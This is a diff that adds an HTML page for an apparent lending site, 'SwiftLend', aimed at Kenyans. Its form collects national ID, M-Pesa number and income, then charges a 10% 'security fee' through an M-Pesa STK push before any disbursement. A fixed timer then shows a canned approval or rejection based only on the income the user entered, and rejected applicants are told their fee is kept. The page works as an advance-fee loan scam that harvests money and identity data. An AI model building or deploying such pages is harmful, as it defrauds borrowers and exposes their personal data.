@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apply Now | SwiftLend</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        .apply-container {
+            max-width: 600px;
+            margin: 60px auto;
+            background: rgba(255, 255, 255, 0.8);
+            backdrop-filter: blur(20px);
+            padding: 50px;
+            border-radius: 32px;
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.5);
+        }
+
+        .form-group {
+            margin-bottom: 24px;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 700;
+            color: var(--secondary-color);
+        }
+
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 16px;
+            border: 1px solid #e2e8f0;
+            border-radius: 16px;
+            font-family: inherit;
+            background: #fff;
+            transition: var(--transition);
+        }
+
+        .form-group input:focus, .form-group select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(0, 210, 106, 0.1);
+        }
+
+        .success-message {
+            display: none;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <header>
+        <nav class="container">
+            <a href="index.html" class="logo">
+                <img src="logo.png" alt="SwiftLend Logo">
+                <span class="logo-text">Swift<span>Lend</span></span>
+            </a>
+        </nav>
+    </header>
+
+    <div class="container">
+        <div class="apply-container" id="form-container">
+            <h2>Loan Application</h2>
+            <p style="margin-bottom: 32px; color: var(--text-light); text-align: center;">Join thousands of Kenyans using swifter finance.</p>
+
+            <div id="verification-notice"
+                style="background: #fff3cd; border: 1px solid #ffeeba; color: #856404; padding: 20px; border-radius: 16px; margin-bottom: 32px; font-size: 0.95rem; line-height: 1.5;">
+                <strong>Verification Notice:</strong> To verify your application and ensure instant disbursement, a security fee of <strong>10% of your applied amount</strong> will be requested via M-Pesa STK push.
+            </div>
+
+            <form id="loan-form">
+                <div class="form-group">
+                    <label>Full Name</label>
+                    <input type="text" id="full-name" placeholder="Enter your full name" required>
+                </div>
+                <div class="form-group">
+                    <label>ID Number</label>
+                    <input type="number" id="id-number" placeholder="Enter National ID number" required>
+                </div>
+                <div class="form-group">
+                    <label>Email Address</label>
+                    <input type="email" id="email" placeholder="example@mail.com" required>
+                </div>
+                <div class="form-group">
+                    <label>M-Pesa Number</label>
+                    <input type="tel" id="phone" placeholder="254 7XX XXX XXX" required>
+                </div>
+                <div class="form-group">
+                    <label>Loan Amount Applied (Ksh)</label>
+                    <input type="number" id="loan-amount" placeholder="e.g. 10000" min="500" max="100000" required>
+                </div>
+                <div class="form-group">
+                    <label>County of Residence</label>
+                    <input type="text" id="county" placeholder="e.g. Nairobi" required>
+                </div>
+                <div class="form-group">
+                    <label>Employment Status</label>
+                    <select id="employment" required>
+                        <option value="">Select status</option>
+                        <option value="employed">Employed</option>
+                        <option value="self-employed">Self-employed</option>
+                        <option value="student">Student</option>
+                        <option value="other">Other</option>
+                    </select>
+                </div>
+                <div class="form-group">
+                    <label>Monthly Income (Ksh)</label>
+                    <input type="number" id="income" placeholder="e.g. 25000" required>
+                </div>
+                <p style="font-size: 0.85rem; color: var(--text-light); margin-bottom: 16px;">By submitting, you authorize the verification check and agree to the terms.</p>
+                <button type="submit" id="submit-btn" class="btn btn-full">Submit Application</button>
+            </form>
+        </div>
+
+        <div class="apply-container success-message" id="success-message">
+            <div id="status-content">
+                <!-- Content will be injected by JS -->
+            </div>
+            <br>
+            <a href="index.html" class="btn btn-primary">Back to Home</a>
+        </div>
+    </div>
+
+    <footer>
+        <div class="container footer-grid">
+            <div class="footer-info">
+                <a href="index.html" class="logo" style="color: white;">
+                    <img src="logo.png" alt="SwiftLend Logo" style="filter: brightness(0) invert(1);">
+                    <span class="logo-text">Swift<span>Lend</span></span>
+                </a>
+                <p>Premium mobile financing. Experience the power of swifter loans.</p>
+                <div class="social-links">
+                    <a href="#" class="social-icon">FB</a>
+                    <a href="#" class="social-icon">TW</a>
+                    <a href="#" class="social-icon">IG</a>
+                    <a href="#" class="social-icon">IN</a>
+                </div>
+            </div>
+            <div class="footer-contact">
+                <h4>Reach SwiftLend</h4>
+                <p>📍 Vision Plaza, Nairobi</p>
+                <p>📧 support@swiftlend.co.ke</p>
+                <p>📞 +254 700 000 000</p>
+            </div>
+        </div>
+    </footer>
+
+    <!-- Custom Prompt Modal -->
+    <div class="modal-overlay" id="modal-overlay">
+        <div class="modal-content">
+            <div class="modal-header">Confirm Submission</div>
+            <div id="modal-body-text" class="modal-body">
+                <!-- Text injected by JS -->
+            </div>
+            <div class="modal-footer">
+                <button class="btn btn-secondary" id="modal-cancel">Cancel</button>
+                <button class="btn btn-primary" id="modal-confirm">Confirm</button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        const loanForm = document.getElementById('loan-form');
+        const modalOverlay = document.getElementById('modal-overlay');
+        const modalCancel = document.getElementById('modal-cancel');
+        const modalConfirm = document.getElementById('modal-confirm');
+        const submitBtn = document.getElementById('submit-btn');
+        const formContainer = document.getElementById('form-container');
+        const successMessage = document.getElementById('success-message');
+        const statusContent = document.getElementById('status-content');
+        const modalBodyText = document.getElementById('modal-body-text');
+
+        let pendingFormData = null;
+
+        loanForm.addEventListener('submit', (e) => {
+            e.preventDefault();
+            
+            const phone = document.getElementById('phone').value;
+            const income = parseInt(document.getElementById('income').value);
+            const appliedAmount = parseInt(document.getElementById('loan-amount').value);
+            const fee = Math.round(appliedAmount * 0.10);
+            
+            pendingFormData = { phone, income, appliedAmount, fee };
+            
+            modalBodyText.innerHTML = `
+                Do you want to submit your application for <strong>Ksh ${appliedAmount.toLocaleString()}</strong>? 
+                <br><br>
+                A 10% security deduction of <strong>Ksh ${fee.toLocaleString()}</strong> will be initiated via M-Pesa STK push for verification.
+            `;
+            
+            modalOverlay.style.display = 'flex';
+        });
+
+        modalCancel.addEventListener('click', () => {
+            modalOverlay.style.display = 'none';
+            pendingFormData = null;
+        });
+
+        modalConfirm.addEventListener('click', async () => {
+            modalOverlay.style.display = 'none';
+            if (!pendingFormData) return;
+
+            const { phone, income, appliedAmount, fee } = pendingFormData;
+            const originalBtnText = submitBtn.innerText;
+            
+            submitBtn.innerText = "Initiating M-Pesa Payment...";
+            submitBtn.disabled = true;
+            submitBtn.style.opacity = "0.7";
+
+            try {
+                const response = await fetch('http://localhost:5000/api/stkpush', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ phone, amount: fee }),
+                });
+
+                const data = await response.json();
+
+                if (response.ok) {
+                    formContainer.style.display = 'none';
+                    successMessage.style.display = 'block';
+                    window.scrollTo(0, 0);
+
+                    statusContent.innerHTML = `
+                        <div class="loading-spinner"></div>
+                        <h2>Checking Eligibility...</h2>
+                        <p>Our premium verification system is processing your request. Please check your phone for the M-Pesa prompt of <strong>Ksh ${fee.toLocaleString()}</strong>.</p>
+                    `;
+
+                    setTimeout(() => {
+                        if (income >= 15000) {
+                            statusContent.innerHTML = `
+                                <div class="status-badge status-qualified">Application Received ✅</div>
+                                <span style="font-size: 4rem;">⏳</span>
+                                <h2>Payment Received!</h2>
+                                <p>Please wait for confirmation of your loan. You will receive the amount of <strong>Ksh ${appliedAmount.toLocaleString()}</strong> shortly after the 10% deduction is verified.</p>
+                                <p style="margin-top: 15px; color: #64748b;">Do not close this page or refresh until you receive the SMS confirmation.</p>
+                            `;
+                        } else {
+                            statusContent.innerHTML = `
+                                <div class="status-badge status-declined">Not Qualified ❌</div>
+                                <span style="font-size: 4rem;">⚠️</span>
+                                <h2>Application Update</h2>
+                                <p>Thank you for choosing SwiftLend. Unfortunately, your current profile does not meet our minimum threshold.</p>
+                                <p style="margin-top: 15px; color: #64748b;">Requirement: Monthly income ≥ Ksh 15,000.</p>
+                                <p style="margin-top: 5px; font-size: 0.85rem;">Your verification fee will be held for future eligibility checks.</p>
+                            `;
+                        }
+                    }, 3000);
+
+                } else {
+                    alert("Error: " + (data.error || "Failed to initiate payment."));
+                    resetSubmitButton(originalBtnText);
+                }
+            } catch (error) {
+                console.error("Connection error:", error);
+                resetSubmitButton(originalBtnText);
+            }
+        });
+
+        function resetSubmitButton(text) {
+            submitBtn.innerText = text;
+            submitBtn.disabled = false;
+            submitBtn.style.opacity = "1";
+        }
+    </script>
+</body>
+
+</html>
